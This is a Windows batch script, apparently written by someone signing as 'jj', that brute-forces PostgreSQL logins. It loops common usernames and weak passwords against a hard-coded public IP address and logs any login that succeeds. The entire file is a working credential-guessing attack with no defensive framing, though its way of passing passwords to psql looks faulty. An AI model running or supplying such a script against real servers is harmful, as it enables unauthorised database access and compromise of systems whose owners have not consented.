@echo off
cls
color 2e
echo.
echo      ##########################################
echo      # postgreSQL - Brute force Atack .bat (by jj) #
echo      ##########################################
echo.

set list=74.222.5.122
set user=unimake postgres root admin SYSDBA sa user service server
set pass=unimake postgres admin masterkey 123 1234 12345 123456 123456*a 654321*a 456123 123456789 sa toor a1b2c3 admin@123 root@123

echo SELECT version() > comando.sql

echo iniciando...

for %%a in (%list%) do (
 for %%u in (%user%) do (
    echo ### IP[ %%a ] - USUARIO[ %%u ] - SENHA[ vazio ]
    echo ####[IP: %%a - USUARIO: %%u - SENHA: vazio ]#### >> postGre_log.txt
    call psql -h %%a -U %%u --no-password < comando.sql 2> error.txt
    call psql -h %%a -U %%u --no-password < comando.sql 1>> postGre_log.txt 2> error.txt
  for %%p in (%pass%) do (
    echo ### IP[ %%a ] - USUARIO[ %%u ] - SENHA[ %%p ]
    echo ### IP[ %%a ] - USUARIO[ %%u ] - SENHA[ %%p ] >> postGre_log.txt
    call psql -h %%a -U %%u password=%%p < comando.sql 2> error.txt
    call psql -h %%a -U %%u password=%%p < comando.sql 1>> postGre_log.txt 2> error.txt

))) 

del error.txt
del comando.sql
echo.
echo fim...
echo.
color a
pause





